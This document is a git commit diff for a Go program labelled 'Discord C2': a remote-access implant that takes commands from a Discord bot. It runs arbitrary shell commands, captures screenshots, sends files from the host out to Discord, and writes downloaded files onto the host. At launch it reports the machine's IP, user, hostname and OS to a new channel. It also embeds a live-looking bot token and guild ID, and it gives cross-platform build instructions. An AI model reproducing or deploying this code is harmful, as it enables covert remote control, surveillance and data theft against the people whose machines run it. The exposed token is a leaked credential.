20bb7264ed3f5eb58b1347e9e1c8b7db4f7b637c
William Moody <bill@moody>
2022-12-09 01:15:51 +0100

    work at ohme

--- client.go
+++ client.go
@@ -1,29 +1,39 @@
+// Discord C2
 // William Moody
 // 08.12.2022
 
-// 🏃‍♂️ <command           Run the given command (Windows: cmd.exe, Other: bash)
-// 📸                    Take a screenshot
-// 👇 <path>             Download the given file (Less than 8MB)
-// ☝️ <path> *attach     Upload the attached file (Less than 8MB)
-// 💀                    Kill the process
+// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
+// 📸                - Take a screenshot
+// 👇 <path>         - Download the given file (Less than 8MB)
+// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
+// 💀                - Kill the process
+
+// Linux   - GOOS=linux GOARCH=amd64 go build client.go
+// Windows - GOOS=windows GOARCH=amd64 go build client.go
 
 package main
 
 import (
 	"fmt"
+	"image/png"
+	"io"
 	"os"
 	"os/signal"
 	"os/exec"
-	"io"
+	"os/user"
+    "math/rand"
+	"net"
 	"net/http"
-	"syscall"
 	"runtime"
 	"strings"
-	"image/png"
+	"syscall"
+	"time"
 
 	"github.com/kbinani/screenshot"
 	"github.com/bwmarrin/discordgo"
 )
+
+var myChannelId string // Global variable
 
 func getTmpDir() string {
 	if runtime.GOOS == "windows" {
@@ -34,18 +44,21 @@ func getTmpDir() string {
 }
 
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
-	// Ignore own messages
-    if m.Author.ID == s.State.User.ID {
-        return
-    }
+	// Ignores messages in other channels and own messages
+	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
+		return
+	}
+
+	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...
+	flag := 0
 
 	//Run command
 	if strings.HasPrefix(m.Content, "🏃‍♂️") {
 		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd.exe", "/k", m.Content[14:len(m.Content)])
+			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
 		} else {
-			cmd = exec.Command("bash", "-c", m.Content[14:len(m.Content)])
+			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
 		}
 		out, err := cmd.CombinedOutput()
 		if err != nil {
@@ -59,18 +72,21 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		resp.WriteString("```")
 
 		// Message is too long, save as file
-		if (len(resp.String()) > 2000) {
-			f, _ := os.CreateTemp("", "output-*.txt")
+		if (len(resp.String()) > 2000-13) {
+			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
 			f.Write(out)
 			fileName := f.Name()
 			f.Close()
 
 			f, _ = os.Open(fileName)
-			s.ChannelFileSend(m.ChannelID, fileName, f)
-			f.Close()
+			defer f.Close()
+			fileStruct := &discordgo.File{Name: fileName, Reader: f}
+			fileArray := []*discordgo.File{fileStruct}
+			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
 		} else {
-			s.ChannelMessageSend(m.ChannelID, resp.String())
+			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
 		}
+		flag = 1
 	} else if m.Content == "📸" {
 		n := screenshot.NumActiveDisplays()
 		for i := 0; i < n; i++ {
@@ -84,32 +100,51 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 			f, _ := os.Open(fileName)
 			defer f.Close()
-			s.ChannelFileSend(m.ChannelID, fileName, f)
+			fileStruct := &discordgo.File{Name: fileName, Reader: f}
+			fileArray := []*discordgo.File{fileStruct}
+			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
 		}
+		flag = 1
 	} else if strings.HasPrefix(m.Content, "👇") {
 		fileName := m.Content[5:len(m.Content)]
 		f, _ := os.Open(fileName)
+		fi, _ := f.Stat()
 		defer f.Close()
-		s.ChannelFileSend(m.ChannelID, fileName, f)
+		if fi.Size() < 8388608 { // 8MB file limit
+			fileStruct := &discordgo.File{Name: fileName, Reader: f}
+			fileArray := []*discordgo.File{fileStruct}
+			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
+			flag = 1
+		} else {
+			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+		}
 	} else if strings.HasPrefix(m.Content, "☝️") {
 		path := m.Content[7:len(m.Content)]
-		if len(m.Attachments) == 0 {
-			s.ChannelMessageSend(m.ChannelID, "No file attached")
-		} else {
+		if len(m.Attachments) > 0 {
 			out, _ := os.Create(path)
 			defer out.Close()
 			resp, _ := http.Get(m.Attachments[0].URL)
 			defer resp.Body.Close()
 			io.Copy(out, resp.Body)
-			s.ChannelMessageSend(m.ChannelID, "Uploaded file to " + path)
+			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to " + path, m.Reference())
 		}
+		flag = 1
 	} else if m.Content == "💀" {
-		syscall.Kill(syscall.Getpid(), syscall.SIGINT)
+		s.Close()
+		flag = 2
+	}
+
+	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
+	if flag > 0 {
+		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
+		if flag > 1 {
+			os.Exit(0)
+		}
 	}
 }
 
 func main() {
-    dg, err := discordgo.New("Bot MTA1MDM3MjkyMDQwNjQ1NDMyMg.G4hOeG.wdXB96Wj537-4xP3dA9kGMxvc0pivGFuWERKIs")
+    dg, err := discordgo.New("Bot MTA1MDM3MjkyMDQwNjQ1NDMyMg.G4hOeG.wdXB96Wj537-4xP3dA9kGMxvc0pivGFuWERKIs") // Hardcoded bot token
     if err != nil {
 		// Error creating Discord session
         return
@@ -124,6 +159,23 @@ func main() {
 		// Error opening connection
         return
     }
+
+	// Create new channel
+	rand.Seed(time.Now().UnixNano())
+	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999 - 1000) + 1000)
+	c, _ := dg.GuildChannelCreate("1050375937218318376", sessionId, 0) // Guild ID is hardcoded
+	myChannelId = c.ID
+
+	// Send first message with basic info (and pin it)
+	hostname, _ := os.Hostname()
+	currentUser, _ := user.Current()
+	cwd, _ := os.Getwd()
+	conn, _ := net.Dial("udp", "8.8.8.8:80")
+    defer conn.Close()
+    localAddr := conn.LocalAddr().(*net.UDPAddr)
+	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
+	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
+	dg.ChannelMessagePin(myChannelId, m.ID)
 
     // Bot is now running (CTRL+C to quit)
     sc := make(chan os.Signal, 1)
---
+++ go.mod
@@ -0,0 +1,14 @@
+module discord-c2
+
+go 1.19
+
+require (
+	github.com/bwmarrin/discordgo v0.26.1 // indirect
+	github.com/gen2brain/shm v0.0.0-20200228170931-49f9650110c5 // indirect
+	github.com/gorilla/websocket v1.4.2 // indirect
+	github.com/jezek/xgb v0.0.0-20210312150743-0e0f116e1240 // indirect
+	github.com/kbinani/screenshot v0.0.0-20210720154843-7d3a670d8329 // indirect
+	github.com/lxn/win v0.0.0-20210218163916-a377121e959e // indirect
+	golang.org/x/crypto v0.0.0-20210421170649-83a5a9bb288b // indirect
+	golang.org/x/sys v0.0.0-20201119102817-f84b799fce68 // indirect
+)
